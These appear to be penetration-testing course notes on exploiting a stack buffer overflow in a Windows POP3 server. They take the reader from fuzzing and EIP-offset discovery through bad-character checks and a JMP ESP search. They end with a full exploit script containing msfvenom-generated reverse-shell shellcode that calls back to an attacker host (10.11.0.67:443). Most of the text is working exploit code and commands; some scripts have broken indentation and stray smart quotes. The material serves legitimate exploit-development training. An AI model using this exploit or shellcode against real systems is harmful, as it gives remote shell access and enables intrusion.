Buffer overflows
Three ways to identify flaws in applications
	1. Source code review
	2. Reverse engineering (decompiling)
	3. Fuzzing
Fuzzing
#!/usr/bin/python
import socket
# Create an array of buffers, from 1 to 5900, with increments of 200.
buffer=["A"]
counter=100
while len(buffer) <= 30:
buffer.append("A"*counter)
counter=counter+200
for string in buffer:
print "Fuzzing PASS with %s bytes" % len(string)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('10.0.0.22',110))
s.recv(1024)
s.send('USER test\r\n')
s.recv(1024)
s.send('PASS ' + string + '\r\n')
s.send('QUIT\r\n')
s.close()
Windows example
Build a script to replicate the error caused by the fuzzing script.
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer = 'A' * 2700
try:
    print "\nSending evil buffer..."
    s.connect(('10.0.0.22',110))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3!"
Gain control of EIP
Send a unique string usingmsf-pattern_create -l 2700
	• Insert the generated pattern into the buffer variable of your script
	• Note the characters that overwrite EIP
Use pattern_offset.rb to locate the position of the characters in the string
	• msf-pattern_offset -q 39694438
	• Modify your script to verify results
	• EIP should be cleanly overwritten with Bs (42424242)
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer= 'A' * 2606 + 'B' *4 + 'C' * 90
try:
    print "\nSending evil buffer..."
    s.connect(('10.0.0.22',110))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3!"
Check for bad characters
Start by sending all characters as part of the buffer
Null byte (0x00); carriage return (0x0D); line feed (0x0A) are commonly bad
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
buffer="A"*2606 + "B"*4 + badchars
try:
print "\nSending evil buffer..."
s.connect(('10.0.0.22',110))
data = s.recv(1024)
s.send('USER username' +'\r\n')
data = s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
s.close()
print "\nDone!"
except:
print "Could not connect to POP3!”
Use Hex Dump to examine ESP, looking for characters that cause problems in memory (non-sequential)
Redirect execution
Use Hex Dump to examine ESP at the time of the crash
Redirect program execution to the address ESP points to at the time of the crash
To accomplish this, we need to evaluate the programs modules and dlls to find a reliable location in memory using !mona modules
Find a module that doesn't use DEP or ASLR AND that the memory range doesn't contain bad characters
Once a module is identified, use the "executable modules" window in immunity debugger to review the module (double click to open)
Right click --> search to find commands within the DLL
If none are available, it may be because limited portions of the module are marked as executable
Find a reliable location in memory that contains a JMP ESP
Use Metasploit NASM Shell ruby script to find the equivalent of JMP ESP
msf0nasm_shell JMP ESP (returns FFE4)
Use Mona to find a suitable location in memory (No DEP, ASLR, bad characters)
!mona find -s “\xff\xe4” -m slmfc.dll
Once a suitable memory location is selected, modify the script
Buffer= “A” 2606 + “\x8f\x35\x4a\x5f” + “C” * 390
Reverse the memory location in Windows (little endian format)
Before running the program, be sure to place a breakpoint in Immunity by searching for the memory location containing the JMP ESP and pressing F2
Find a suitable location in the buffer for your shellcode
You may need to increase the buffer length by sending more input
buffer = "A" * 2606 + "B" * 4 + "C" * (3500 – 2606 - 4)
Generate shellcode with Metasploit
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.67 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
To prevent the decoder from overwriting the shellcode, pad with NOPs
Final exploit:
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
shellcode = ("\xba\xde\xea\x23\x34\xda\xce\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x52\x31\x57\x12\x03\x57\x12\x83\x31\x16\xc1\xc1\x31\x0f\x84"
"\x2a\xc9\xd0\xe9\xa3\x2c\xe1\x29\xd7\x25\x52\x9a\x93\x6b\x5f"
"\x51\xf1\x9f\xd4\x17\xde\x90\x5d\x9d\x38\x9f\x5e\x8e\x79\xbe"
"\xdc\xcd\xad\x60\xdc\x1d\xa0\x61\x19\x43\x49\x33\xf2\x0f\xfc"
"\xa3\x77\x45\x3d\x48\xcb\x4b\x45\xad\x9c\x6a\x64\x60\x96\x34"
"\xa6\x83\x7b\x4d\xef\x9b\x98\x68\xb9\x10\x6a\x06\x38\xf0\xa2"
"\xe7\x97\x3d\x0b\x1a\xe9\x7a\xac\xc5\x9c\x72\xce\x78\xa7\x41"
"\xac\xa6\x22\x51\x16\x2c\x94\xbd\xa6\xe1\x43\x36\xa4\x4e\x07"
"\x10\xa9\x51\xc4\x2b\xd5\xda\xeb\xfb\x5f\x98\xcf\xdf\x04\x7a"
"\x71\x46\xe1\x2d\x8e\x98\x4a\x91\x2a\xd3\x67\xc6\x46\xbe\xef"
"\x2b\x6b\x40\xf0\x23\xfc\x33\xc2\xec\x56\xdb\x6e\x64\x71\x1c"
"\x90\x5f\xc5\xb2\x6f\x60\x36\x9b\xab\x34\x66\xb3\x1a\x35\xed"
"\x43\xa2\xe0\xa2\x13\x0c\x5b\x03\xc3\xec\x0b\xeb\x09\xe3\x74"
"\x0b\x32\x29\x1d\xa6\xc9\xba\x28\x37\xd1\x3e\x45\x35\xd1\x3f"
"\x2e\xb0\x37\x55\x40\x95\xe0\xc2\xf9\xbc\x7a\x72\x05\x6b\x07"
"\xb4\x8d\x98\xf8\x7b\x66\xd4\xea\xec\x86\xa3\x50\xba\x99\x19"
"\xfc\x20\x0b\xc6\xfc\x2f\x30\x51\xab\x78\x86\xa8\x39\x95\xb1"
"\x02\x5f\x64\x27\x6c\xdb\xb3\x94\x73\xe2\x36\xa0\x57\xf4\x8e"
"\x29\xdc\xa0\x5e\x7c\x8a\x1e\x19\xd6\x7c\xc8\xf3\x85\xd6\x9c"
"\x82\xe5\xe8\xda\x8a\x23\x9f\x02\x3a\x9a\xe6\x3d\xf3\x4a\xef"
"\x46\xe9\xea\x10\x9d\xa9\x1b\x5b\xbf\x98\xb3\x02\x2a\x99\xd9"
"\xb4\x81\xde\xe7\x36\x23\x9f\x13\x26\x46\x9a\x58\xe0\xbb\xd6"
"\xf1\x85\xbb\x45\xf1\x8f")
buffer= 'A' *2606 + "\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode + 'C' * (3500-2606-4-351-16)
try:
print "\nSending evil buffer..."
s.connect(('10.0.0.22',110))
data = s.recv(1024)
s.send('USER username' +'\r\n')
data = s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
s.close()
print "\ Done. Did you get a reverse shell?"
except:
print "Could not connect to POP3!"
Setup a netcat listener on the attacking machine
Send the exploit: python exploit.py
Linux
Similar to Windows
Use Evans Linux Debugger (EDB)

